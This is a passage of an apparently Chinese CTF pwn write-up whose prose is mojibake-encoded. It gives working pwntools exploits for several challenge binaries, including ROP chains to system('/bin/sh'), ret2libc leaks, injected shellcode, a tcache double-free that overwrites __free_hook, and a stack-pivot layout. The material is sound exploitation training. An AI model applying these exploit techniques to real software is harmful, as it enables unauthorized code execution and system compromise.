</span></span></code></pre></div><h3 id=harekazectf2019baby_rop class="relative group">[HarekazeCTF2019]baby_rop <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#harekazectf2019baby_rop aria-label=é”šç‚¹>#</a></span></h3><p>å‘ç° <code>main</code> é‡Œæœ‰ <code>system</code>ï¼Œç„¶åè¿˜æ‰¾åˆ°äº† <code>/bin/sh</code> å­—ç¬¦ä¸²å’Œ <code>pop rdi</code> çš„ gadgetï¼Œé‚£å°±è€åŠæ³•ä¼ å‚å°±è¡Œäº†ï¼Œå°±æ˜¯ getshell ä¹‹åéœ€è¦æ‰¾ä¸€ä¸‹ flag çš„ä½ç½®ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x601048</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400683</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=pwn2_sctf_2016 class="relative group">pwn2_sctf_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#pwn2_sctf_2016 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜å…ˆä¼šè®©ç”¨æˆ·è®¾ç½®è¯»å…¥æ•°æ®é•¿åº¦ï¼Œå¦‚æœå¤§äº 32 åˆ™é€€å‡ºã€‚ç”±äºå®ƒè‡ªå·±å®ç°çš„ <code>get_n</code> å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>unsigned int</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œå› æ­¤å¯ä»¥è¾“å…¥ <code>-1</code> äº§ç”Ÿæ ˆæº¢å‡ºæ¼æ´ã€‚ç„¶å ret2libc å°±å¥½ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;read?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>you_said_s</span> <span class=o>=</span> <span class=mh>0x80486f8</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x2c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>],</span><span class=n>you_said_s</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;You said:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;You said:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>printf</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;printf&#39;</span><span class=p>,</span><span class=n>printf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>printf</span><span class=p>,</span><span class=s1>&#39;printf&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;read?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;-1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x2c</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ez_pz_hackover_2016 class="relative group">ez_pz_hackover_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ez_pz_hackover_2016 aria-label=é”šç‚¹>#</a></span></h3><p>è¿™é¢˜è¦æ±‚å­—ç¬¦ä¸² <code>s</code> ä»¥ <code>crackme\x00</code> å¼€å¤´ï¼Œéšåä¼šæ‰§è¡Œ <code>memcpy</code> å°†æˆ‘ä»¬çš„è¾“å…¥å¤åˆ¶åˆ°ä¸€ä¸ª <code>dest</code> ä½ç½®ã€‚æˆ‘ä»¬é€šè¿‡ gdb è°ƒè¯•å¯ä»¥æµ‹å‡ºå…¶è·ç¦» ebp è·ç¦»ä¸º 22ï¼Œè¦è¦†ç›–åˆ°è¿”å›åœ°å€åˆ™éœ€è¦ 26 å­—èŠ‚ã€‚è‡³äºè¿”å›åœ°å€ï¼Œé¢˜ç›®æä¾›äº†å­—ç¬¦ä¸² <code>s</code> çš„åœ°å€ï¼Œä½†æ˜¯ç›´æ¥ä»¥å®ƒä½œä¸ºè¿”å›åœ°å€ä¼šå¤±è´¥ï¼Œgdb è°ƒè¯•åˆ° <code>vuln</code> å‡½æ•°ä¸­çš„ <code>ret</code> è¯­å¥çš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿”å›åœ°å€ä½äº <code>0xffca41dc</code>ï¼Œè€Œæˆ‘ä»¬å†™å…¥çš„æ•°æ®ä½äº <code>0xffca41c0</code>ï¼Œç›¸å·® <code>0x1c</code>ï¼Œå› æ­¤è¿˜éœ€è¦è€ƒè™‘è¯¥åç§»é‡ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;crash:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;ss&#39;</span><span class=p>,</span><span class=n>ss</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;crashme</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>26</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>ss</span><span class=o>-</span><span class=mh>0x1c</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_ne_5 class="relative group">ciscn_2019_ne_5 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_ne_5 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜æœ‰ <code>GetFlag</code> çš„åé—¨ï¼Œæœ‰ä¸€ä¸ª <code>memcpy</code> çš„æ“ä½œï¼Œæ­¤æ—¶éœ€è¦å…³æ³¨çš„åç§»å®é™…ä¸Šæ˜¯ <code>dest</code> åˆ° <code>ebp</code> çš„è·ç¦»ã€‚ç®¡ç†å‘˜å¯†ç å¯ç›´æ¥é€šè¿‡åç¼–è¯‘å¾—åˆ°ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=mh>0x80482ea</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;password:&#39;</span><span class=p>,</span><span class=s1>&#39;administrator&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x48</span><span class=o>+</span><span class=mi>4</span><span class=p>),</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>],</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;info:&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Exit</span><span class=se>\n</span><span class=s1>:&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=harekazectf2019baby_rop2 class="relative group">[HarekazeCTF2019]baby_rop2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#harekazectf2019baby_rop2 aria-label=é”šç‚¹>#</a></span></h3><p>é¢˜ç›®ç»™å®šäº† libcï¼Œç»“åˆé¢˜ç›®åå¯ä»¥æƒ³åˆ° ret2libcï¼Œè¿™é‡Œåªèƒ½è°ƒç”¨ <code>printf</code> æ¥æ‰“å°å‡½æ•° GOT åœ°å€ï¼Œå…¶ä½™å’Œå¸¸è§„ ret2libc ç›¸åŒã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400733</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span> <span class=n>read</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span> <span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>read</span><span class=p>,</span><span class=s1>&#39;read&#39;</span><span class=p>,</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name?&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_n_5 class="relative group">ciscn_2019_n_5 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_n_5 aria-label=é”šç‚¹>#</a></span></h3><p>æœ¬é¢˜æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå› æ­¤æ–¹æ³•å¤šæ ·ï¼Œä¾‹å¦‚ ret2libcï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400713</span>
</span></span><span class=line><span class=cl><span class=c1>#ret = 0x4004c9</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>read</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span><span class=n>read</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span> <span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>read</span><span class=p>,</span><span class=s1>&#39;read&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>æˆ–è€…æ›´ç®€å•çš„ ret2shellcodeï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>()))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x28</span><span class=p>,</span><span class=mh>0x601080</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;me?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>ç”±äºè¿œç¨‹ libc ç‰ˆæœ¬å’Œæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ç‰ˆæœ¬ä¸åŒï¼Œæ‰“è¿œç¨‹æ—¶æ¨èä½¿ç”¨ ret2shellcodeï¼Œæ„Ÿè§‰è¿™ä¸ªæ›´æ¥è¿‘é¢„æœŸè§£ã€‚</p><h3 id=ciscn_2019_final_3 class="relative group">ciscn_2019_final_3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_final_3 aria-label=é”šç‚¹>#</a></span></h3><p>æä¾›äº† libcï¼Œå‘ç°æ˜¯ 2.27 ç‰ˆæœ¬çš„ï¼Œè€ƒè™‘å’Œ tcache åˆ©ç”¨æœ‰å…³ã€‚</p><p>ç¨‹åºæä¾›äº† <code>add</code> å’Œ <code>remove</code> ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆ <code>add</code> åªèƒ½åˆ›å»ºå°äº 0x78 å­—èŠ‚çš„ chunkï¼Œä¸”æœ€å¤šåˆ›å»º 0x18 ä¸ª chunkã€‚<code>gift</code> ä¼šè¿”å›åˆ†é…åˆ°çš„å†…å­˜åœ°å€ã€‚è€Œåœ¨ <code>remove</code> ä¸­ï¼Œ<code>free</code> ä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½® nullï¼Œå­˜åœ¨ double freeã€‚</p><p>ç”±äºé¢˜ç›®ç»™äº† libcï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½æ³„éœ² libc åœ°å€ï¼Œè¿™å°±éœ€è¦ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd æŒ‡å‘ libcã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼Œunsorted bin æŒ‡å‘ <code>main_arena</code> çš„æŒ‡é’ˆæ˜¯æŒ‡å‘ libc çš„ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æŠŠè¿™ä¸ªæŒ‡é’ˆç»™ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd å‘¢ï¼Ÿ</p><p>ç”±äº 0x78 å­—èŠ‚çš„é™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ›å»ºé€‚åˆæ”¾å…¥ unsorted bin ä¸­çš„ chunkï¼Œå› æ­¤éœ€è¦å…ˆåˆå¹¶å°å †å—ï¼Œç„¶åä¿®æ”¹ <code>chunk0</code> çš„ <code>chunk_size</code> æŠŠä»–å˜æˆä¸€ä¸ªå¤§å †å—ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿™ä¸ª <code>chunk_size</code> å­—æ®µï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° double freeï¼Œå‡è®¾æˆ‘ä»¬è¿ç»­ç”³è¯·å †å—ç”³è¯·åˆ°äº† <code>chunk11</code>ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>chunk0</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span>
</span></span></code></pre></div><blockquote><p>æ³¨ï¼šç¬¬äºŒæ¬¡åˆ†é…äº† 0x18 å­—èŠ‚æ˜¯ 64 ä½ä¸‹æœ€å°åˆ†é…å¤§å°ã€‚è¿™ä¸ª <code>chunk1</code> çš„åˆ†é…æ˜¯ä¸ºäº†è®© unsorted bin ä¸ tcache é”™ä½ã€‚</p></blockquote><p>é‚£ä¹ˆè¿™æ—¶è¿ç»­ä¸¤æ¬¡ <code>free</code> æ‰ <code>chunk11</code>ï¼Œå† <code>add</code> å›æ¥ï¼Œä½¿å¾— <code>chunk11->fd = chunk0-0x10</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨ <code>chunk0-0x10</code> å¤„ä¼ªé€ äº†ä¸€ä¸ªå †å—ï¼Œå†æ¬¡ <code>add</code> å°±ä¼šåˆ†é…åˆ° <code>chunk0-0x10</code>ï¼Œæ­¤æ—¶å¡«å…¥å‡†å¤‡å¥½çš„ <code>prev_size</code> åŠ <code>chunk_size</code> å³å¯ä¿®æ”¹ <code>chunk0</code> å¤§å°ã€‚æ³¨æ„ä¸ºäº†ç¡®ä¿é‡Šæ”¾åè¿›å…¥ unsorted binï¼Œ<code>chunk_size</code> éœ€å¤§äº 0x400 å­—èŠ‚ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>chunk0</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span> <span class=c1># chunk11-&gt;fd = chunk0-0x10</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>chunk0</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x4a1</span><span class=p>))</span>
</span></span></code></pre></div><p>éšåæˆ‘ä»¬é‡Šæ”¾ <code>chunk0</code> å°±ä¼šè¿›å…¥ unsorted binï¼Œè€Œé‡Šæ”¾ <code>chunk1</code> ä¼šè¿›å…¥ <code>tcache[0]</code>ã€‚æ­¤æ—¶ <code>add</code> å°±ä¼šå¾—åˆ° <code>chunk0</code>ï¼Œå¹¶ä½¿å¾— <code>chunk1->fd = main_arena</code>ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€æ¬¡ <code>add</code> å¾—åˆ° <code>chunk1</code>ï¼Œä¸‹ä¸€æ¬¡ <code>add</code> å¾—åˆ° <code>main_arena</code>ï¼Œå‡å»åç§»é‡å³ libc åŸºå€ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># tcache[0]</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x78</span><span class=p>)</span> <span class=c1># chunk0; chunk1-&gt;fd = main_arena</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># chunk1</span>
</span></span><span class=line><span class=cl><span class=n>main_arena</span> <span class=o>=</span> <span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>main_arena</span> <span class=o>-</span> <span class=mh>0x3ebca0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span> <span class=n>base</span><span class=p>)</span>
</span></span></code></pre></div><p>æœ€åå†æ¬¡åˆ©ç”¨ double freeï¼Œç”¨ <code>one_gadget</code> è¦†ç›– <code>free_hook</code>ï¼Œå†æ¬¡è°ƒç”¨ <code>remove</code> å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=mh>0x10a38c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>remove</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_es_2 class="relative group">ciscn_2019_es_2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_es_2 aria-label=é”šç‚¹>#</a></span></h3><p>åªèƒ½æº¢å‡º 8 å­—èŠ‚ï¼Œç©ºé—´å¤ªå°ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚å¦‚ä¸‹å¸ƒç½®æ ˆï¼š</p><pre tabindex=0><code>ret addr
ebp-0x2c
padding
/sh\x00
/bin
ebp-0x1c
padding
system
padding
ebp-0x24
padding
padding
